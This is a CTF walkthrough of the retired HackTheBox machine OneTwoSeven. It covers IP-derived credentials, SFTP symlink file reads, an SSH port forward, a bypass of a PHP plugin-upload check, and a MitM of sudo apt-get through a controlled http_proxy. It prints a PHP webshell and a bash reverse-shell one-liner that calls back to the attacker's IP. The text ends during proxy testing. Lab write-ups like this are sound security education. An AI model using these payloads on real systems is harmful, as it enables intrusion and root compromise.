---
title: HTB: OneTwoSeven
url: https://0xdf.gitlab.io/2019/08/31/htb-onetwoseven.html
date: 2019-08-31T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-onetwoseven, hackthebox, nmap, sftp, tunnel, ssh, chroot, vim, crackstation, php, webshell, apt, mitm
---

![OneTwoSeven-cover](https://0xdfimages.gitlab.io/img/onetwoseven-cover.png)

OneTwoSeven was a very cleverly designed box. There were lots of steps, some enumeration, all of which was do-able and fun. I’ll start by finding a hosting provider that gives me SFTP access to their system. I’ll use that to tunnel into the box, and gain access to the admin panel. I’ll find creds for that using symlinks over SFTP. From there, I’ll exploit a logic error in the plugin upload to install a webshell. To get root, I’ll take advantage of my user’s ability to run apt update and apt upgrade as root, and man-in-the-middle the connection to install a backdoored package.

## Box Info

| Name | [OneTwoSeven](https://hackthebox.com/machines/onetwoseven)  [OneTwoSeven](https://hackthebox.com/machines/onetwoseven) [Play on HackTheBox](https://hackthebox.com/machines/onetwoseven) |
| --- | --- |
| Release Date | [20 Apr 2019](https://twitter.com/hackthebox_eu/status/1119149746407350272) |
| Retire Date | 31 Aug 2019 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for OneTwoSeven |
| Radar Graph | Radar chart for OneTwoSeven |
| First Blood User | 00:53:52[mprox mprox](https://app.hackthebox.com/users/16690) |
| First Blood Root | 02:33:43[mprox mprox](https://app.hackthebox.com/users/16690) |
| Creator | [jkr jkr](https://app.hackthebox.com/users/77141) |

## Recon

### nmap

`nmap` shows two open ports, ssh (tcp 22) and http (tcp 80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.133
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-04 08:10 EDT
Warning: 10.10.10.133 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.133
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
60080/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds
root@kali# nmap -sC -sV -p 22,80,60080 -oA scans/nmap-scripts 10.10.10.133
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-04 08:13 EDT
Nmap scan report for 10.10.10.133
Host is up (0.088s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Page moved.
60080/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds

```

Port 60080 is also showing filtered, which suggests something might be running there, but maybe blocked by a firewall.

### Web - TCP 80

#### Site

The site is for a hosting service called OneTwoSeven:

![1566766911604](https://0xdfimages.gitlab.io/img/1566766911604.png)

This site includes some really awesome jokes, but there’s also some hints in there. For example:

> We may drop SYNs for some time if the error count per source IP address is too high.

That rules out running something like `gobuster` to directory brute force, at least to start.

Also:

> Migrate your pages to our new IPv6 only service and you can half your audience. Stay tuned for the announcement of this service.

Sounds like this isn’t available yet. I’ll look for signs of it, but likely no IPv6 here.

And:

> we wanted to provide PHP hosting as well for all of you but we could not master chroot() handling for Apache properly.

This suggests that php will be blocked (at least on the main site), and that they have issues with `chroot`. Things to keep an eye on.

The menu bar across the top has three items. Home is the page shown above. Statistics shows a `/stats.php`:

![1566767059522](https://0xdfimages.gitlab.io/img/1566767059522.png)

The final link, Admin, is disabled. Still, looking at the source, I can see not only it’s target but some comments:

```

<!-- Only enable link if access from trusted networks admin/20190212 -->
<!-- Added localhost admin/20190214 -->
	  <li class="nav-item"><a id="adminlink" class="nav-link disabled" href="http://onetwoseven.htb:60080/">Admin</a></li>

```

#### signup

There are also several links on `index.php` that take me to `/signup.php`, which creates me an account, and provides credentials:

![1559680070929](https://0xdfimages.gitlab.io/img/1559680070929.png)

The link for my homepage goes to `http://onetwoseven.htb/~ots-mM2Y3Y2U`, which shows an image of a wall.

#### Predicting Logins / Passwords

In HTB or any other CTF, any time I see a username or password or cookie that looks random, but is the same for me each time, I take a poke at seeing if I can figure out how it is generated. For HTB, what typically makes sense is to seed some algorithm with the IP address of the user, so that each player is kept unique. In this case, I have a user name that looks like `ots-[base64 stuff]` and a password that looks like `[hex stuff]`.

I can start by taking hashes of my ip:

```

root@kali# for hash in md5 sha1 sha256; do echo -n 10.10.14.7 | ${hash}sum; done
41f3f7ce2330eb39c588058e8ece111f  -
0688fe0c0daa5296c6b26c2b877989311c98e2c2  -
1a217fe8f0a4694ef899b1a33fd7b6661fc849abb9cdd1e1ebc426346d8dda3b  -

```

The password is the first 8 characters of the md5 of the users IP. Nice. What about that base64? It’s not in the base64 of the IP address:

```

root@kali# echo -n 10.10.14.7 | base64
MTAuMTAuMTQuNw==

```

What about base64 of the hashes? I’ll use `grep` to see if my username is in any output:

```

root@kali# for hash in md5 sha1 sha256; do echo -n "${hash}: ";echo -n 10.10.14.7 | ${hash}sum | base64 -w0; echo; done | grep mM2Y3Y2U
md5: NDFmM2Y3Y2UyMzMwZWIzOWM1ODgwNThlOGVjZTExMWYgIC0K

```

There’s a hit, in the base64 of the md5. Now I can create a nice `bash` one liner to make usernames and password for any ip:

```

root@kali# IP=10.10.14.7; echo -n "Username: ots-"; echo -n $IP | md5sum | base64 -w0 | cut -c4-11; echo -n "Password: "; echo -n $IP | md5sum | cut -c-8
Username: ots-mM2Y3Y2U
Password: 41f3f7ce

```

I could check out what others are doing, but based on the name of the box, I’ll try localhost:

```

root@kali# IP=127.0.0.1; echo -n "Username: ots-"; echo -n $IP | md5sum | base64 -w0 | cut -c4-11; echo -n "Password: "; echo -n $IP | md5sum | cut -c-8
Username: ots-yODc2NGQ
Password: f528764d

```

And with that I can connect, and find `user.txt`:

```

root@kali# sftp ots-yODc2NGQ@10.10.10.133
ots-yODc2NGQ@10.10.10.133's password: 
Connected to ots-yODc2NGQ@10.10.10.133.
sftp> ls
public_html  user.txt     
sftp> get user.txt
Fetching /user.txt to user.txt
/user.txt 

```

```

root@kali# cat user.txt 
93a4ce6d...

```

### SFTP - TCP 22

Continuing on with the creds I was given, I’ll try different ways to connect.

#### SSH

SSH has multiple channels such as shell, exec, forwards, SFTP. And each is independent. In this case, it looks like ssh is blocked:

```

root@kali# ssh ots-mM2Y3Y2U@10.10.10.133
ots-mM2Y3Y2U@10.10.10.133's password: 
This service allows sftp connections only.
Connection to 10.10.10.133 closed.

```

#### SFTP

I can SFTP in:

```

root@kali# sftp ots-mM2Y3Y2U@10.10.10.133
ots-mM2Y3Y2U@10.10.10.133's password:
Connected to ots-mM2Y3Y2U@10.10.10.133.
sftp> ls
public_html

```

If I type `help`, I get a list of the commands:

```

sftp> help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
chgrp grp path                     Change group of file 'path' to 'grp'
chmod mode path                    Change permissions of file 'path' to 'mode'
chown own path                     Change owner of file 'path' to 'own'
df [-hi] [path]                    Display statistics for current directory or
                                   filesystem containing 'path'
exit                               Quit sftp
get [-afPpRr] remote [local]       Download file
reget [-fPpRr] remote [local]      Resume download file
reput [-fPpRr] [local] remote      Resume upload file
help                               Display this help text
lcd path                           Change local directory to 'path'
lls [ls-options [path]]            Display local directory listing
lmkdir path                        Create local directory
ln [-s] oldpath newpath            Link remote file (-s for symlink)
lpwd                               Print local working directory
ls [-1afhlnrSt] [path]             Display remote directory listing
lumask umask                       Set local umask to 'umask'
mkdir path                         Create remote directory
progress                           Toggle display of progress meter
put [-afPpRr] local [remote]       Upload file
pwd                                Display remote working directory
quit                               Quit sftp
rename oldpath newpath             Rename remote file
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
version                            Show SFTP version
!command                           Execute 'command' in local shell
!                                  Escape to local shell
?                                  Synonym for help

```

#### Shell Upload - Fail

I can go for a simple php shell upload:

```

sftp> put /opt/shells/php/cmd.php 
Uploading /opt/shells/php/cmd.php to /public_html/cmd.php
/opt/shells/php/cmd.php 

sftp> ls
cmd.php   index.html

```

It seems to work. But the site doesn’t load it:

![1559681697565](https://0xdfimages.gitlab.io/img/1559681697565.png)

In fact, if I use `rename` to move `index.html`, I can see the dir listing, but it doesn’t show `cmd.php` either:

![1559681785589](https://0xdfimages.gitlab.io/img/1559681785589.png)

## Admin Panel Access

### SFTP Symlinks

There’s two commands in the SFTP help that jump out: `ln [-s] oldpath newpath` and `symlink oldpath newpath`. These commands are actually the same. I wonder if I can make links to paths outside my current visibility. First create a link for `/etc/password`:

```

sftp> symlink /etc/passwd passwd
sftp> ls
cmd.php   old.html  passwd  

```

It shows in the dirlist through the webserver:

![1559682044710](https://0xdfimages.gitlab.io/img/1559682044710.png)

And I can load it (at least some version of it):

![1559682080171](https://0xdfimages.gitlab.io/img/1559682080171.png)

This might be the poor `chroot` implementation hinted at during enumeration.

I’ll link the system root:

```

sftp> rm passwd
Removing /public_html/passwd

sftp> symlink / root

```

![1559682140414](https://0xdfimages.gitlab.io/img/1559682140414.png)

I can’t access any of the folders except `var`. Inside `var`, only `www`. There I see two folders:

![1559682203214](https://0xdfimages.gitlab.io/img/1559682203214.png)

I’ll make a good guess that `html` is the webserver on 80 and `html-admin` is the one on 60080.

Clicking the link to `html` just redirects me to the main page. But `html-admin` loads parts of that folder:

![1559682821519](https://0xdfimages.gitlab.io/img/1559682821519.png)

It’s clear that the php files are filtered from my view. But there’s a `.swp` file, which is likely dumped from vim. I can click on it and download it.

I’ll name it `.login.php.swp`, and then run `vim login.php`. It will ask if I want to recover the swap file:

![1559686636800](https://0xdfimages.gitlab.io/img/1559686636800.png)

On selecting `R`, I’ll see `login.php`, which includes this bit:

```

          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
          if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
                  $_SESSION['username'] = 'ots-admin';
          header("Location: /menu.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>

```

Username ots-admin and password hash. The hash breaks in crackstation as Homesweethome1:

![1559686748399](https://0xdfimages.gitlab.io/img/1559686748399.png)

As an alternative to using the `.swp` file, I can also use symlinks to access the page source directly. From SFTP, I create a symlink to the admin `login.php`:

```

sftp> symlink /var/www/html-admin/login.php login

```

Now I visit `http://onetwoseven.htb/~ots-mM2Y3Y2U/login`, and view the page source the same as from the `.swp` file.

### Port Forward

Just because SSH shell is blocked, it is still possible that I can initiate a port forward over the SSH connection. To do this, I’ll start `ssh` with the `-N` flag, which the [man page](https://linux.die.net/man/1/ssh) defines as `Do not execute a remote command. This is useful for just forwarding ports (protocol version 2 only).`

I suspect that port 60080 is only accessibly from localhost, as `nmap` showed it as filtered and the link to the admin page said so. So I’ll try to connect:

```

root@kali# ssh -N -L 60080:127.0.0.1:60080 ots-mM2Y3Y2U@10.10.10.133
ots-mM2Y3Y2U@10.10.10.133's password:

```

From there, my terminal hangs.

### Port 60080 Access

I can now make use of the tunnel by visiting `http://127.0.0.1:60080`, and I get the “OneTwoSeven Administration” page:

![1559718622749](https://0xdfimages.gitlab.io/img/1559718622749.png)

I’ll log in with “ots-admin” / “Homesweethome1”:

![1559718694802](https://0xdfimages.gitlab.io/img/1559718694802.png)

### SFTP as ots-admin

In the admin panel, one of the options is “OTS Default User”. Clicking it give the following info:

![1559724978116](https://0xdfimages.gitlab.io/img/1559724978116.png)

I suspect this is the intended way to get access to `user.txt`. Just like above, I can SFTP as this user, I’ll find the `user.txt`:

```

root@kali# sftp ots-yODc2NGQ@10.10.10.133
ots-yODc2NGQ@10.10.10.133's password:
Connected to ots-yODc2NGQ@10.10.10.133.
sftp> ls
public_html  user.txt
sftp> get user.txt
Fetching /user.txt to user.txt
/user.txt   

```

```

root@kali# cat user.txt 
93a4ce6d...

```

## Shell as www-admin-data

### Enumerating Plugin Manager

#### Rewrite Rules

There’s a handful of plugins on the Administration page. In looking at them, other than getting creds from the Default Users plugin to get `user.txt`, there’s only one that really looks interesting, the “OTS Addon Manager”. Clicking on it gives the following note:

![1559725848688](https://0xdfimages.gitlab.io/img/1559725848688.png)

This note says that the web server is re-writing urls for both `addon-upload.php` and `addon-download.php` to `addons/ots-man-addon.php`. It also mentions that if these rules are turned off (for example, as a security measure), that a 404 will be returned.

#### OTS Addon Manager Source

The links beside each plugin work to download the source for that plugin:

![1559743738032](https://0xdfimages.gitlab.io/img/1559743738032.png)

That links points to `addon-download`: `http://127.0.0.1:60080/addon-download.php?addon=ots-default-user.php`

Clicking on the `DL` link next to the OTS Addon Manager returns the source. This means that the rewrite is enabled for the `addon-download` path.

I’ll grab the source for all of the plugins. The source for the addon manager, `ots-man-addon.php` is particularly useful:

```

<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS Addon Manager
switch (true) {
	# Upload addon to addons folder.
	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
		if(isset($_FILES['addon'])){
			$errors= array();
			$file_name = basename($_FILES['addon']['name']);
			$file_size =$_FILES['addon']['size'];
			$file_tmp =$_FILES['addon']['tmp_name'];

			if($file_size > 20000){
				$errors[]='Module too big for addon manager. Please upload manually.';
			}

			if(empty($errors)==true) {
				move_uploaded_file($file_tmp,$file_name);
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "File uploaded successfull.y";
			} else {
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "Error uploading the file: ";
				print_r($errors);
			}
		}
		break;
	# Download addon from addons folder.
	case preg_match('/\/addon-download.php/',$_SERVER['REQUEST_URI']):
		if ($_GET['addon']) {
			$addon_file = basename($_GET['addon']);
			if ( file_exists($addon_file) ) {
				header("Content-Disposition: attachment; filename=$addon_file");
				header("Content-Type: text/plain");
				readfile($addon_file);
			} else {
				header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
				die();
			}
		}
		break;
	default:
		echo "The addon manager must not be executed directly but only via<br>";
		echo "the provided RewriteRules:<br><hr>";
		echo "RewriteEngine On<br>";
		echo "RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]<br>";
		echo "RewriteRule ^addon-download.php addons/ots-man-addon.php [L]<br><hr>";
		echo "By commenting individual RewriteRules you can disable single<br>";
		echo "features (i.e. for security reasons)<br><br>";
		echo "<font size='-2'>Please note: Disabling a feature through htaccess leads to 404 errors for now.</font>";
		break;
}
?>

```

The first line checks the request uri to see if it contains `/addons/`, and dies if it does. That confirms the note from the page that directly accessing the plugin won’t work.

Next, it checks if `/addon-upload.php` is in the uri, and if so, runs the code to save the plugin. If that fails, it checks for `/addon-download.php` and if so, runs the code to return the plugin source. If that match fails, it returns the message that I saw when I ran the plugin from the main panel.

### Enable Plugin Upload

At the bottom of the page, there’s a form to upload a plugin:

![1559744795348](https://0xdfimages.gitlab.io/img/1559744795348.png)

The “Submit” button is disabled “for security reasons”.

I can enable that button simply by right clicking on it in Firefox, and selecting Inspect Element:

![1559744872837](https://0xdfimages.gitlab.io/img/1559744872837.png)

I can right click on that source, and select “Edit as HTML”. Then I’ll remove `disabled="disabled"`. Now the button is no longer grayed out:

![1559744949081](https://0xdfimages.gitlab.io/img/1559744949081.png)

I’ll use the “Browse” button to pick a simple php webshell, and then (with Burp in place), hit “Submit Query”. Unfortunately, it returns a 404:

![1559745037521](https://0xdfimages.gitlab.io/img/1559745037521.png)

This suggests that the rewrite rules are not in place for upload.

### Trick The Script

To get my plugin uploaded, I need to trick the script. The only way I know to get to the script in a way that it won’t die is to submit to `/addon-download.php`. But I want to upload. For that, I need to have `/addon-upload.php` in the uri. I can achieve this with a dummy parameter: `http://127.0.0.1:60080/addon-download.php?0xdf=/addon-upload`.

I’ll send my post that returned 404 to Burp repeater. I’ll simply add the parameter to the url, and hit submit:

[![repeater](https://0xdfimages.gitlab.io/img/1559745391185.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1559745391185.png)

It reports the upload was successful. I’ll check in `/addons`, and it’s there:

![1559745453574](https://0xdfimages.gitlab.io/img/1559745453574.png)

I can go to the url and add a `cmd=id` parameter and I have execution:

![1559745485925](https://0xdfimages.gitlab.io/img/1559745485925.png)

### Shell

To upgrade this to a shell, I’ll go back into repeater and change the content of my plugin from:

```

<?php system($_REQUEST['cmd']); ?>

```

to:

```

<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'"); ?>

```

I’ll submit, and it overwrites my previous shell. Then I’ll refresh the page, and `nc` gets a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.133.
Ncat: Connection from 10.10.10.133:41336.
bash: cannot set terminal process group (1352): Inappropriate ioctl for device
bash: no job control in this shell
www-admin-data@onetwoseven:/var/www/html-admin/addons$

```

## Shell as root

### Enumeration

`sudo -l` gives an interesting result:

```

www-admin-data@onetwoseven:/var/www/html-admin/addons$ sudo -l
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade

```

I can run `apt-get update` and `apt-get upgrade` as root. Not only that, but `env_keep` says what when I use `sudo` to run these, the `http_proxy` and `https_proxy` values from my current session will be kept.

Enumerating `apt` a bit further, I’ll check the sources. The `sources.list` file looks like the normal one for the distribution, providing three repos to contact:

```

www-admin-data@onetwoseven:/etc/apt$ cat sources.list
#

# deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free

deb http://de.deb.devuan.org/merged ascii main
# deb-src http://de.deb.devuan.org/merged ascii main

deb http://de.deb.devuan.org/merged ascii-security main
# deb-src http://de.deb.devuan.org/merged ascii-security main

deb http://de.deb.devuan.org/merged ascii-updates main
# deb-src http://de.deb.devuan.org/merged ascii-updates main

```

There are two additional sources files in the `sources.list.d` directory (which are combined with the `sources.list` file to create the full list of sources, per the [man page](https://linux.die.net/man/5/sources.list)):

```

www-admin-data@onetwoseven:/etc/apt$ ls sources.list.d/
devuan.list  onetwoseven.list

```

`devuan.list` is commented out:

```

www-admin-data@onetwoseven:/etc/apt$ cat sources.list.d/devuan.list
# autogenerated by devuan-baseconf
# decomment following lines to  enable the developers devuan repository
#deb http://packages.devuan.org/devuan ascii main
#deb-src http://packages.devuan.org/devuan ascii main

```

`onetwoseven.list` has a comment says it is not yet in use, but the source is not commented, meaning it will be used:

```

www-admin-data@onetwoseven:/etc/apt$ cat sources.list.d/onetwoseven.list
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main

```

I can see this in action if I run `sudo apt-get update`, where it tries to contact the three Debian repos and `packages.onetwoseven.htb`, all without success:

```

www-admin-data@onetwoseven:/etc/apt$ sudo /usr/bin/apt-get update
Err:1 http://packages.onetwoseven.htb/devuan ascii InRelease
  Temporary failure resolving 'packages.onetwoseven.htb'
Err:2 http://de.deb.devuan.org/merged ascii InRelease
  Temporary failure resolving 'de.deb.devuan.org'
Err:3 http://de.deb.devuan.org/merged ascii-security InRelease
  Temporary failure resolving 'de.deb.devuan.org'
Err:4 http://de.deb.devuan.org/merged ascii-updates InRelease
  Temporary failure resolving 'de.deb.devuan.org'
Reading package lists... Done
W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii/InRelease  Temporary failure resolving 'de.deb.devuan.org'
W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-security/InRelease  Temporary failure resolving 'de.deb.devuan.org'
W: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-updates/InRelease  Temporary failure resolving 'de.deb.devuan.org'
W: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease  Temporary failure resolving 'packages.onetwoseven.htb'
W: Some index files failed to download. They have been ignored, or old ones used instead.

```

### Strategy

I’m going to use my ability to run `apt-get update` and `apt-get upgrade` as root with a `http_proxy` environment variable I control to MitM the process. I’ll host a proxy on my Kali box that will hijack the connection to `packages.onetwoseven.htb` and point it to a server on my box. I’ll return a backdoored version of some application as an upgrade, and use that to get command execution and and root shell.

### MitM

To position myself to serve updates, I’ll need to tell OneTwoSeven to proxy through me, and I’ll need a proxy and server waiting.

#### http\_proxy

First I’ll tell OneTwoSeven to proxy http through me by exporting the environment variable:

```

www-admin-data@onetwoseven:/$ export http_proxy=http://10.10.14.7:8888
www-admin-data@onetwoseven:/$ echo $http_proxy
http://10.10.14.7:8888

```

#### proxy.py

I’ll use [proxy.py](https://github.com/abhinavsingh/proxy.py) as my proxy. I can install it with `pip install --upgrade proxy.py`. Then I’ll run it, telling it to listen on all IPs and giving it the port to listen on:

```

root@kali# proxy.py --hostname 0.0.0.0 --port 8888
2019-08-26 06:05:16,433 - INFO - run:633 - Starting server on port 8888

```

#### /etc/hosts

Were I to run `apt-get update` right now, the requests would come to my proxy, where the requests for the three real Debian distros would proxy out to the internet, and the requests for `packages.onetwoseven.htb` would die because my host can’t resolve them. I want the three main ones to redirect off to nowhere, and the custom one to point to my host. I’ll use the `hosts` file to achieve that:

```
127.0.0.1 packages.onetwoseven.htb
192.0.2.1 de.deb.devuan.org

```
192.0.2.0/24 is a reserved block for testing (see [RFC 5737](https://tools.ietf.org/html/rfc5737)), so it shouldn’t be in use.

#### Testing

I’ll stand up a simple python web server and then run `apt-get update`. I’m going to include the full output I see in each of the windows because it’s interesting to understand what’s going on. On OneTwoSeven:

```

www-admin-data@onetwoseven:/$ sudo /usr/bin/apt-get update
Ign:1 http://packages.onetwoseven.htb/devuan ascii InRelease
Ign:2 http://packages.onetwoseven.htb/devuan ascii Release
Ign:3 http://packages.onetwoseven.htb/devuan ascii/main all Packages
Ign:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages
Ign:5 http://packages.onetwoseven.htb/devuan ascii/main Translation-en
Ign:3 http://packages.onetwoseven.htb/devuan ascii/main all Packages
Ign:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages
Ign:5 http://packages.onetwoseven.htb/devuan ascii/main Translation-en
Ign:3 http://packages.onetwoseven.htb/devuan ascii/main all Packages
Ign:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages
Ign:5 http://packages.onetwoseven.htb/devuan ascii/main Translation-en
Ign:3 http://packages.onetwoseven.htb/devuan ascii/main all Packages
Ign:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages
Ign:5 http://packages.onetwoseven.htb/devuan ascii/main Translation-en
Ign:3 http://packages.onetwoseven.htb/devuan ascii/main all Packages
Ign:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages
Ign:5 http://packages.onetwoseven.htb/devuan ascii/main Translation-en
Ign:3 http://packages.onetwoseven.htb/devuan ascii/main all Packages
Err:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages
  404  File not found
Ign:5 http://packages.onetwoseven.htb/devuan ascii/main Translation-en
Ign:6 http://de.deb.devuan.org/merged ascii InRelease
Ign:7 http://de.deb.devuan.org/merged ascii-security InRelease
Ign:8 http://de.deb.devuan.org/merged ascii-updates InRelease
Err:9 http://de.deb.devuan.org/merged ascii Release
  Connection failed
Err:10 http://de.deb.devuan.org/merged ascii-security Release
  Connection failed
Err:11 http://de.deb.devuan.org/merged ascii-updates Release
  Connection failed
Reading package lists... Done
W: The repository 'http://packages.onetwoseven.htb/devuan ascii Release' does not have a Release file.
N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
N: See apt-secure(8) manpage for repository creation and user configuration details.
E: The repository 'http://de.deb.devuan.org/merged ascii Release' does no longer have a Release file.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
E: The repository 'http://de.deb.devuan.org/merged ascii-security Release' does no longer have a Release file.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
E: The repository 'http://de.deb.devuan.org/merged ascii-updates Release' does no longer have a Release file.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.

```

I see it’s trying to request a bunch of things from `packages.onetwoseven.htb`, and there’s at least one 404 message. It also tries to connect to `de.deb.devuan.org`, but returns `Connection failed`.

In the proxy window, I see all the attempts to reach various files on my server, all with 404:

```

root@kali# proxy.py --hostname 0.0.0.0 --port 8888
2019-08-26 06:40:09,282 - INFO - run:633 - Starting server on port 8888
2019-08-26 06:40:13,003 - INFO - _access_log:519 - 10.10.10.133:32778 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/InRelease - 404 File not found - 653 bytes                                                                                        
2019-08-26 06:40:13,062 - INFO - _access_log:519 - 10.10.10.133:32782 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/Release - 404 File not found - 653 bytes                                                                                          
2019-08-26 06:40:13,122 - INFO - _access_log:519 - 10.10.10.133:32784 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-amd64/Packages.xz - 404 File not found - 653 bytes                                                                    
2019-08-26 06:40:13,177 - INFO - _access_log:519 - 10.10.10.133:32786 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-all/Packages.xz - 404 File not found - 653 bytes                                                                      
2019-08-26 06:40:13,234 - INFO - _access_log:519 - 10.10.10.133:32788 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/i18n/Translation-en.xz - 404 File not found - 653 bytes                                                                      
2019-08-26 06:40:13,295 - INFO - _access_log:519 - 10.10.10.133:32790 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-amd64/Packages.bz2 - 404 File not found - 653 bytes                                                                   
2019-08-26 06:40:13,354 - INFO - _access_log:519 - 10.10.10.133:32792 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-all/Packages.bz2 - 404 File not found - 653 bytes                                                                     
2019-08-26 06:40:13,410 - INFO - _access_log:519 - 10.10.10.133:32794 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/i18n/Translation-en.bz2 - 404 File not found - 653 bytes                                                                     
2019-08-26 06:40:13,473 - INFO - _access_log:519 - 10.10.10.133:32796 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-amd64/Packages.lzma - 404 File not found - 653 bytes                                                                  
2019-08-26 06:40:13,548 - INFO - _access_log:519 - 10.10.10.133:32798 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-all/Packages.lzma - 404 File not found - 653 bytes                                                                    
2019-08-26 06:40:13,603 - INFO - _access_log:519 - 10.10.10.133:32800 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/i18n/Translation-en.lzma - 404 File not found - 653 bytes                                                                    
2019-08-26 06:40:13,661 - INFO - _access_log:519 - 10.10.10.133:32802 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-amd64/Packages.gz - 404 File not found - 653 bytes                                                                    
2019-08-26 06:40:13,715 - INFO - _access_log:519 - 10.10.10.133:32804 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-all/Packages.gz - 404 File not found - 653 bytes                                                                      
2019-08-26 06:40:13,768 - INFO - _access_log:519 - 10.10.10.133:32806 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/i18n/Translation-en.gz - 404 File not found - 653 bytes                                                                      
2019-08-26 06:40:13,828 - INFO - _access_log:519 - 10.10.10.133:32808 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-amd64/Packages.lz4 - 404 File not found - 653 bytes                                                                   
2019-08-26 06:40:13,879 - INFO - _access_log:519 - 10.10.10.133:32810 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-all/Packages.lz4 - 404 File not found - 653 bytes                                                                     
2019-08-26 06:40:13,952 - INFO - _access_log:519 - 10.10.10.133:32812 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/i18n/Translation-en.lz4 - 404 File not found - 653 bytes                                                                     
2019-08-26 06:40:14,015 - INFO - _access_log:519 - 10.10.10.133:32814 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-amd64/Packages - 404 File not found - 653 bytes                                                                       
2019-08-26 06:40:14,071 - INFO - _access_log:519 - 10.10.10.133:32818 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/binary-all/Packages - 404 File not found - 653 bytes                                                                         
2019-08-26 06:40:14,127 - INFO - _access_log:519 - 10.10.10.133:32820 - GET packages.onetwoseven.htb:80/devuan/dists/ascii/main/i18n/Translation-en - 404 File not found - 653 bytes  

```

On my webserver, I see a bunch of failed requests for the same files:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [26/Aug/2019 06:40:13] code 404, message File not found
